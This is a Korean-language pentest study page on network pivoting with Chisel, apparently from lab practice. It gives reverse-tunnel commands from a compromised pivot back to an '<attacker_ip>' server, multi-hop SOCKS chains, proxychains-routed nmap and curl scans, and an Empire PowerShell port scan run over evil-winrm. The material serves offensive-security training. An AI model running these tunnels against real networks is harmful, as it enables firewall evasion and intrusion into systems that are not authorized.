---
layout: page
title: Pivoting_Guide
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


# 피버팅 및 터널링 가이드 (Chisel 활용)

피버팅(Pivoting)은 공격자가 이미 장악한 시스템(Pivot)을 발판 삼아, 직접 접근할 수 없는 다른 네트워크 대역(내부망)으로 공격 범위를 확장하는 핵심적인 측면 이동(Lateral Movement) 기술입니다. 이 가이드는 강력한 터널링 도구인 `Chisel`을 중심으로 피버팅의 개념과 실제 적용 방법을 설명합니다.

- **[Chisel GitHub 링크](https://github.com/jpillora/chisel)**

---

### **1. 핵심 개념: 리버스 터널링 (Reverse Tunnelling)**

`Chisel`의 가장 강력한 기능은 **리버스(Reverse)** 방식입니다. 방화벽은 보통 외부에서 내부로 들어오는 인바운드(Inbound) 연결은 차단하지만, 내부에서 외부로 나가는 아웃바운드(Outbound) 연결은 허용하는 경우가 많습니다. 리버스 터널링은 이 점을 이용하여, 공격 대상 네트워크의 Pivot 장비가 **클라이언트(Client)**가 되어 공격자의 서버에 접속을 요청하고, 공격자는 **서버(Server)** 역할을 하여 연결을 수락함으로써 터널을 생성합니다. 이를 통해 방화벽을 쉽게 우회하고 안정적인 연결을 확보할 수 있습니다.

---

### **2. 단일 피벗 (Single Pivot)**

- **시나리오:** 공격자(Kali)가 인터넷에 노출된 웹 서버(Pivot)를 장악했고, 이 웹 서버를 통해 내부망(10.200.180.0/24)에 접근하고자 합니다.

#### **1단계: 공격자 머신 - Chisel 서버 실행**
```bash
# --reverse: 클라이언트로부터의 리버스 연결을 허용
./chisel server -p 9001 --reverse
```

#### **2단계: Pivot 장비 - Chisel 클라이언트 실행**
- 먼저 `chisel` 바이너리를 Pivot 장비에 업로드해야 합니다.
```bash
# <attacker_ip>:9001: 공격자 Chisel 서버에 접속
# R:socks: 원격(공격자) 측에 SOCKS 프록시를 생성하라는 의미. 
#         (R은 Remote의 약자로, 클라이언트 입장에서의 Remote는 서버를 의미)
./chisel client <attacker_ip>:9001 R:socks
```
- 이 명령이 실행되면, 공격자 머신의 `127.0.0.1:1080`에 SOCKS5 프록시가 생성됩니다. (기본 포트 1080)

#### **3단계: 공격자 머신 - Proxychains 설정**
- `/etc/proxychains4.conf` 파일의 맨 아래에 Chisel이 생성한 SOCKS 프록시를 추가합니다.
```ini
[ProxyList]
socks5 127.0.0.1 1080
```

#### **4단계: 내부망 정찰**
- 이제 `proxychains`를 명령어 앞에 붙이면, 모든 트래픽이 터널을 통해 Pivot 장비를 거쳐 내부망으로 전달됩니다.
```bash
# Proxychains를 통해 내부망의 다른 호스트(10.200.180.150)를 스캔
proxychains nmap -sT -Pn -p 22,80,445 10.200.180.150

# 내부 웹 서버에 접근
proxychains curl http://10.200.180.150
```

---

### **3. 다중 피벗 (Multi-hop Pivot)**

- **시나리오:** 공격자 -> Pivot 1 -> Pivot 2 -> 내부망 타겟
- **원리:** 각 Pivot 장비는 이전 장비를 향한 `chisel client`인 동시에, 다음 장비를 위한 `chisel server` 역할을 수행합니다.
- **참고 다이어그램:** [[Multi-hope pivoting diagram]]

#### **단계별 Chisel 명령어**

1.  **공격자 Kali:**
    ```bash
    # 최종 목적지로부터의 연결을 받을 서버 (포트 9001)
    ./chisel server -p 9001 --reverse
    ```

2.  **Pivot 1:**
    ```bash
    # 1. Kali의 서버(9001)에 접속하여 첫 번째 터널 생성 (공격자 쪽에 9999 포트로 프록시 생성)
    ./chisel client <Kali_IP>:9001 R:9999:socks

    # 2. Pivot 2의 접속을 받을 새로운 서버 실행 (포트 9002)
    ./chisel server -p 9002 --reverse
    ```

3.  **Pivot 2:**
    ```bash
    # Pivot 1의 서버(9002)에 접속하여 두 번째 터널 생성 (공격자 쪽에 8888 포트로 프록시 생성)
    ./chisel client <Pivot1_IP>:9002 R:8888:socks
    ```

4.  **공격자 Proxychains 설정:**
    - `/etc/proxychains4.conf`에 모든 프록시를 순서대로 추가합니다.
    ```ini
    #[ProxyList]
    socks5 127.0.0.1 9999
    socks5 127.0.0.1 8888
    ```

---

### **4. PowerShell을 이용한 내부망 포트 스캔**

- **상황:** `evil-winrm` 등으로 Windows Pivot 장비에 접속했으며, `proxychains`를 사용하기 어려운 경우.
- **전략:** Pivot 장비 자체에서 PowerShell 스크립트를 이용해 내부망을 스캔합니다.
- **[스크립트 링크](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1)**

```powershell
# 1. evil-winrm의 upload 기능을 이용해 Invoke-Portscan.ps1 스크립트 업로드

# 2. 스크립트를 현재 세션으로 로드
Import-Module .\Invoke-Portscan.ps1

# 3. 내부망의 다른 호스트를 대상으로 상위 50개 포트 스캔
Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 50
```